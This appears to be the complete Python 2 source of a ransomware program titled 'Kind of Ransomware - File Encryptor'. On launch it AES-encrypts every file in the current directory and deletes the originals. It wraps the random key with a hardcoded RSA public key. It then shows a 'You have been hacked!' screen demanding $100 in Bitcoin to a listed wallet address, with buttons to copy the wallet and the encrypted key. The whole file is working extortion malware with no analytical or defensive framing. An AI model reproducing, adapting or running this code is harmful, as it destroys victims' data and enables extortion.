import os, random, io
import tkFont
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import Tkinter as tk
from PIL import ImageTk, Image
import string
from Crypto.PublicKey import RSA
import tkMessageBox
import base64
import pyperclip



PUBLIC_KEY="-----BEGIN PUBLIC KEY-----\n\
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlERucWY3fsCqKLYR8qmN\n\
i28Vg6cgjYPu469XolKPOm+WrMqOpJpzdZ0ntF5DjzYl7DbkRJYlmMWmtlMaPP/8\n\
xD/S6CY+0klnjtVda5M2XROqfeWTEjzt3Ql+/Ld6ko38gd7c4K2CJ/2pDwIuQPco\n\
hPVK9baiwaEztD2sZHwnU7e8oXgYVOJVriO04FrA/23eFtm1ZZ/ROJ+IE5bxl6NR\n\
87bwPX1t80YA27Hh/eUWY6zCFIDiYDfQk8SCtjMvWcqLZBViTYlhcOYfbFrVFq3z\n\
qcSdE9XAZJow2X0pMl1kyCI0N8st+zIpWMOejlGodl2xkRUfyTBqDrgjrpXm5H+z\n\
nwIDAQAB\n\
-----END PUBLIC KEY-----"

PASSWORD=""
directory=os.getcwd()


def encrypt(key,filename):
	chunksize = 64*1024
	outputFile = filename+".enc"
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = ''

	for i in range(16):
		IV += chr(random.randint(0, 0xFF))

	encryptor = AES.new(key, AES.MODE_CBC, IV)
	with open(filename, 'rb') as infile:
		with open(outputFile, 'wb') as outfile:
			outfile.write(filesize)
			outfile.write(IV)
			
			while True:
				chunk = infile.read(chunksize)
				
				if len(chunk) == 0:
					break
				elif len(chunk) % 16 != 0:
					chunk += ' ' * (16 - (len(chunk) % 16))

				outfile.write(encryptor.encrypt(chunk))
	os.remove(filename)

def decrypt(key, filename):
	chunksize = 64*1024
	outputFile = os.path.splitext(filename)[0]
	
	with open(filename, 'rb') as infile:
		filesize = long(infile.read(16))
		IV = infile.read(16)

		decryptor = AES.new(key, AES.MODE_CBC, IV)

		with open(outputFile, 'wb') as outfile:
			while True:
				chunk = infile.read(chunksize)

				if len(chunk) == 0:
					break

				outfile.write(decryptor.decrypt(chunk))
			outfile.truncate(filesize)
	os.remove(filename)

def genRandom():
        global PASSWORD
        PASSWORD=''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(24))
    

def getKey():
        publicKey=RSA.importKey(PUBLIC_KEY)
        encrypted = publicKey.encrypt(PASSWORD,32)
        
        return encrypted[0].encode('base64')

def encryptAll(key):
        for filename in os.listdir(directory):
                if(filename=="Ransomware.pyw" or filename=="Ransomware.pyproj" or filename=="back.png" or filename=="anon.png"):
                        continue
                else:
                        encrypt(key, filename)

def decryptAll():
        global decryptPassword
        key=decryptPassword.get("1.0", "end-1c")
        if(len(key)==24):
                for filename in os.listdir(directory):
                        if(os.path.splitext(filename)[1]==".enc"):
                                decrypt(key, filename)
 
                                
def copyCipher():
        pyperclip.copy(getKey())
        tkMessageBox.showinfo("Copied","Ciphertext copied to clipboard!")

def copyWallet():
        pyperclip.copy("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2")
        tkMessageBox.showinfo("Copied","Wallet address copied to clipboard!")
        
class Application(tk.Frame):
        
        
                

        def __init__(self, master=None):
       
                tk.Frame.__init__(self, master, cursor="pirate")   
                self.grid()       
               
                defaultFont=tkFont.Font(size=14, family='Arial')

                #Background image
                backgroundImage=ImageTk.PhotoImage(Image.open("back.png"))
                imgBackground=tk.Label(self, image=backgroundImage, width=900, height=600).grid(rowspan=3, columnspan=3)
                backgroundImage.image=backgroundImage     

                #Logo Image
                imgLocation=Image.open("anon.png")
                myImage=ImageTk.PhotoImage(imgLocation)
                self.imgLogo=tk.Label(self,image=myImage, bg="black")
                self.imgLogo.grid(column=0, row=0, columnspan=3)
                self.imgLogo.image=myImage

                hackedMessage=tk.Message(self,bg="black", fg="white", width=800, font=tkFont.Font(size=12) ,text="You have been hacked! \
All your files have been encrypted and you can not access them. To get your files back you have to \
make a payment. You have to pay 100$ in the following wallet adress: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2. \
Click the Copy cipher button to get your cipher and send it to us, include it in the description of the payment.\n\n", takefocus=True)
                hackedMessage.grid(column=0, row=1, columnspan=3, padx=20, sticky=tk.N)

                cipherButton=tk.Button(self, text="Copy cipher", command=copyCipher,font=defaultFont,  bg="black", fg="white")
                cipherButton.grid(column=0, row=1, sticky=tk.S+tk.W, columnspan=3, padx=250)

                walletButton=tk.Button(self, text="Copy wallet address", command=copyWallet,font=defaultFont,  bg="black", fg="white")
                walletButton.grid(column=0, row=1, sticky=tk.S+tk.E, columnspan=3, padx=250)
       
                passwordMessage=tk.Label(self, bg="black", fg="white", text="Password:", font=defaultFont)
                passwordMessage.grid(column=0, row=2,sticky=tk.W, padx=65)

                global decryptPassword
                decryptPassword=tk.Text(self, width=45, height=1, font=defaultFont, bg="black", fg="white", pady=5, bd=3, \
                        insertbackground="white")
                decryptPassword.grid(column=0, row=2, columnspan=3)
                decryptButton = tk.Button(self, text='Decrypt' ,command=decryptAll\
                        , font=defaultFont,  bg="black", fg="white")
                decryptButton.grid(column=2, row=2, sticky=tk.E, padx=80)
        
genRandom()
encryptAll(PASSWORD)
app = Application()                       
app.master.title('Kind of Ransomware - File Encryptor')    
app.mainloop()    



